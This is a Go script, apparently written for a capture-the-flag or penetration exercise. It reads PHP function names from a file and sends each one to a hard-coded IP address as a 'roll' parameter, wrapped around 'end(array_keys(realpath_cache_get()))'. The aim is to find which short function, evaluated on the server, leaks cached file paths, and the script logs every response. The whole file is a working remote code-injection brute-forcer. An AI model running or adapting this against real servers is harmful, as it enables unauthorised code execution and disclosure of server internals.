package main

import (
	"bufio"
	"io/ioutil"
	"log"
	"net/http"
	"os"
)

func main() {
	file, err := os.Open("functions.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	logs, err := os.Create("logs.txt")
	if err != nil {
		log.Println(err)
		return
	}
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		if len(scanner.Text()) >= 11 {
			continue
		}
		resp, err := http.Get("http://192.46.227.32/?roll=" + scanner.Text() + "(end(array_keys(realpath_cache_get())))")
		if err != nil {
			log.Println(err)
			return
		}
		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			print(err)
		}
		_, err = logs.WriteString("Function: " + scanner.Text() + "\nResponse: " + string(body) + "\n")
		if err != nil {
			log.Println(err)
			return
		}
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
}
